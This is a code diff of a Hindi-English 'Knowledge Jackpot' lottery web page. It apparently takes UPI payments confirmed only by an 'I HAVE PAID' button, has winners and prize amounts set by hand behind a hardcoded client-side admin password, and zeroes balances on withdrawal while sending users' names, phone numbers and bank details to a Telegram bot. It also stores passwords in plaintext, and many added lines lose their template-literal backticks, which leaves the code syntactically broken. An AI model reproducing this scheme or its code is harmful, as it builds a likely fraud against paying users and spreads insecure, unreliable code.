@@ -58,7 +58,7 @@
 </div>
 
 <div style="padding: 10px;">
-    <button id="rBtn" class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT (OTP)</button>
+    <button id="rBtn" class="btn btn-gold" onclick="showReg()">➕ CREATE ACCOUNT (DIRECT)</button>
     <button class="btn btn-dark" onclick="showProfile()">👤 MY PROFILE & CODES</button>
     <button class="btn btn-gold" onclick="showWinners()">🏆 TOP WINNERS</button>
     <button class="btn" style="background:#555; color:white;" onclick="showTC()">📄 TERMS & CONDITIONS</button>
@@ -77,7 +77,6 @@
 
     let db = JSON.parse(localStorage.getItem('dkj_vfinal_db')) || { users: [], entries: [], winners: [] };
     let currentUser = JSON.parse(localStorage.getItem('dkj_vfinal_user')) || null;
-    let tempOTP = "";
 
     const questions = [
         {q: "India ka National Game kaun sa hai?", a: "hockey"},
@@ -101,39 +100,46 @@
     }
 
     function tgMsg(msg) {
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        fetch(https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown);
     }
 
     function showReg() {
-        tempOTP = Math.floor(1000 + Math.random() * 9000);
-        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input type="text" id="rn" placeholder="Name"><input type="number" id="rm" placeholder="Mobile"><input type="password" id="rp" placeholder="Password"><button class="btn btn-tg" onclick="sendOTP()">GET OTP</button><input id="ro" placeholder="Enter OTP"><button class="btn btn-gold" onclick="doReg()">CREATE</button>`;
+        document.getElementById('pContent').innerHTML = `
+            <h2 style="color:var(--gold);">CREATE ACCOUNT</h2>
+            <input type="text" id="rn" placeholder="Enter Full Name">
+            <input type="number" id="rm" placeholder="Enter Mobile Number">
+            <input type="password" id="rp" placeholder="Create Password">
+            <button class="btn btn-gold" onclick="doReg()">REGISTER NOW</button>
+            <p style="font-size:12px; color:#aaa;">No OTP Required! Instant Joining.</p>
+        `;
         document.getElementById('popup').style.display = 'block';
     }
 
-    function sendOTP() {
-        tgMsg(`🔑 *OTP*: ${tempOTP}\nUser: ${document.getElementById('rn').value}`);
-        alert("OTP Sent to Telegram!");
-    }
-
     function doReg() {
-        if(document.getElementById('ro').value != tempOTP) return alert("Wrong OTP!");
-        currentUser = { name: document.getElementById('rn').value, mob: document.getElementById('rm').value, pass: document.getElementById('rp').value, bal: 0, id: Math.floor(1000+Math.random()*8999), codes: [] };
-        db.users.push(currentUser); save(); updateUI(); closeP();
+        const n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
+        if(!n || !m || !p) return alert("Please fill all details!");
+        
+        currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*8999), codes: [] };
+        db.users.push(currentUser); 
+        save(); 
+        updateUI(); 
+        tgMsg(✅ *NEW REGISTRATION*\n👤 Name: ${n}\n📱 Mobile: ${m}\n🆔 User ID: ${currentUser.id});
+        alert("Account Created Successfully!");
+        closeP();
     }
 
     function join(amt) {
-        if(!currentUser) return alert("Please Login!");
-        // --- CHECK IF USER ALREADY HAS AN ACTIVE TICKET ---
+        if(!currentUser) return alert("Pehle Account Banayein!");
         let hasActive = db.entries.find(e => e.uId == currentUser.id);
-        if(hasActive) return alert("Aapke paas pehle se ek active ticket hai. Winner announcement ka intezar karein!");
+        if(hasActive) return alert("Aapke paas pehle se ek active ticket hai!");
 
-        document.getElementById('pContent').innerHTML = `<h2>PAYMENT</h2><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}&am=${amt}"><button class="btn btn-gold" onclick="showQuiz()">I HAVE PAID</button>`;
+        document.getElementById('pContent').innerHTML = <h2>PAYMENT</h2><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}&am=${amt}"><button class="btn btn-gold" onclick="showQuiz()">I HAVE PAID</button>;
         document.getElementById('popup').style.display = 'block';
     }
 
     function showQuiz() {
         let qz = questions[Math.floor(Math.random()*questions.length)];
-        document.getElementById('pContent').innerHTML = `<h2>KNOWLEDGE TEST</h2><p>${qz.q}</p><input id="gkAns" placeholder="Your Answer"><button class="btn btn-gold" onclick="generateTicket()">SUBMIT</button>`;
+        document.getElementById('pContent').innerHTML = <h2>KNOWLEDGE TEST</h2><p>${qz.q}</p><input id="gkAns" placeholder="Your Answer"><button class="btn btn-gold" onclick="generateTicket()">SUBMIT</button>;
     }
 
     function generateTicket() {
@@ -141,50 +147,41 @@
         currentUser.codes.push(ticket);
         db.entries.push({ uId: currentUser.id, name: currentUser.name, code: ticket });
         save();
-        tgMsg(`🎟 *ENTRY*\nUser: ${currentUser.name}\nTicket: ${ticket}`);
-        alert("Success! Aapka Code: " + ticket + "\n(Bhale hi jawab galat ho, Knowledge Jackpot aapko mauka deta hai!)");
+        tgMsg(🎟 *NEW TICKET*\n👤 User: ${currentUser.name}\n🎫 Ticket: ${ticket});
+        alert("Success! Ticket Code: " + ticket);
         closeP(); updateUI();
     }
 
     function showTC() {
-        document.getElementById('pContent').innerHTML = `
-            <h2 style="color:var(--gold);">Terms & Conditions</h2>
-            <div class="tc-text">
-                <p>1. Ek user ek waqt mein sirf 1 hi active ticket le sakta hai.</p>
-                <p>2. Draw ki nishchit date <b>13 March 2026</b> hai, lekin management ise kabhi bhi aage badha sakta hai.</p>
-                <p>3. Winner ka chayan puri tarah se computerised random system dwara kiya jata hai.</p>
-                <p>4. Withdrawal request 24-48 ghante mein process ki jati hai.</p>
-                <p>5. Kisi bhi vivad ki sthiti mein DKJ Management ka faisla antim hoga.</p>
-            </div>
-        `;
+        document.getElementById('pContent').innerHTML = <h2 style="color:var(--gold);">Terms & Conditions</h2><div class="tc-text"><p>1. Ek user ek waqt mein sirf 1 hi active ticket le sakta hai.</p><p>2. Draw ki nishchit date <b>13 March 2026</b> hai, lekin management ise kabhi bhi aage badha sakta hai.</p><p>3. Winner ka chayan puri tarah se random system dwara kiya jata hai.</p><p>4. Withdrawal request 24 ghante mein process ki jati hai.</p></div>;
         document.getElementById('popup').style.display = 'block';
     }
 
     function withdraw() {
         if(!currentUser || currentUser.bal <= 0) return alert("No Balance!");
-        document.getElementById('pContent').innerHTML = `<h2>WITHDRAW</h2><input id="wON" placeholder="Account Holder Name"><input id="wBN" placeholder="Bank/UPI Name"><input id="wAN" placeholder="Account No."><input id="wIF" placeholder="IFSC Code"><button class="btn btn-gold" onclick="confirmW()">SUBMIT</button>`;
+        document.getElementById('pContent').innerHTML = <h2>WITHDRAW</h2><input id="wON" placeholder="Holder Name"><input id="wBN" placeholder="Bank/UPI"><input id="wAN" placeholder="AC No."><input id="wIF" placeholder="IFSC Code"><button class="btn btn-gold" onclick="confirmW()">SUBMIT</button>;
         document.getElementById('popup').style.display = 'block';
     }
 
     function confirmW() {
-        tgMsg(`💰 *WITHDRAW*\nUser: ${currentUser.name}\nAmt: ₹${currentUser.bal}\nHolder: ${document.getElementById('wON').value}\nBank: ${document.getElementById('wBN').value}\nAC: ${document.getElementById('wAN').value}`);
+        tgMsg(💰 *WITHDRAW*\nUser: ${currentUser.name}\nAmt: ₹${currentUser.bal}\nHolder: ${document.getElementById('wON').value}\nBank: ${document.getElementById('wBN').value});
         currentUser.bal = 0; save(); updateUI(); closeP();
-        alert("Request Sent! Balance is now 0.");
+        alert("Request Sent! Balance zero ho gaya.");
     }
 
     function adminMode() {
         if(prompt("Admin PW:") !== "7860") return;
-        let act = prompt("1: Add Winners (20 List)\n2: Reset Data");
+        let act = prompt("1: Add Winners (20 List)\n2: Reset All");
         if(act === "1") {
             let list = [...db.entries].sort(() => 0.5 - Math.random()).slice(0, 20);
-            let h = "<h2>Add Prize Money</h2>";
-            list.forEach((u, i) => { h += `<div class="list-item" onclick="finalWin('${u.uId}', '${u.code}')">${u.name} (Ticket: ${u.code})</div>`; });
+            let h = "<h2>Add Winners</h2>";
+            list.forEach((u, i) => { h += <div class="list-item" onclick="finalWin('${u.uId}', '${u.code}')">${u.name} (Code: ${u.code})</div>; });
             document.getElementById('pContent').innerHTML = h; document.getElementById('popup').style.display = 'block';
         } else if(act === "2") { localStorage.clear(); location.reload(); }
     }
 
     function finalWin(uid, code) {
-        let winAmt = prompt("Amount (₹):");
+        let winAmt = prompt("Prize Amount (₹):");
         if(!winAmt) return;
         let idx = db.entries.findIndex(x => x.uId == uid && x.code == code);
         let user = db.entries[idx];
@@ -208,14 +205,14 @@
         let h = "<h2>🏆 RECENT WINNERS</h2>";
         let mixed = [...db.winners].sort(() => 0.5 - Math.random()).slice(0, 100);
         mixed.forEach(w => {
-            h += `<div class="list-item"><span style="color:var(--gold);">ID: ${w.id}</span> <span style="float:right; color:#27ae60;">₹${w.prize}</span><br><small>${w.name} | ${w.code}</small></div>`;
+            h += <div class="list-item"><span style="color:var(--gold);">ID: ${w.id}</span> <span style="float:right; color:#27ae60;">₹${w.prize}</span><br><small>${w.name} | ${w.code}</small></div>;
         });
         document.getElementById('pContent').innerHTML = h; document.getElementById('popup').style.display = 'block';
     }
 
     function showProfile() {
         if(!currentUser) return;
-        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p>ID: ${currentUser.id}</p><p>Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
+        document.getElementById('pContent').innerHTML = <h2>MY PROFILE</h2><p>ID: ${currentUser.id}</p><p>Mobile: ${currentUser.mob}</p><p>Codes: ${currentUser.codes.join(", ") || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>;
         document.getElementById('popup').style.display = 'block';
     }
 
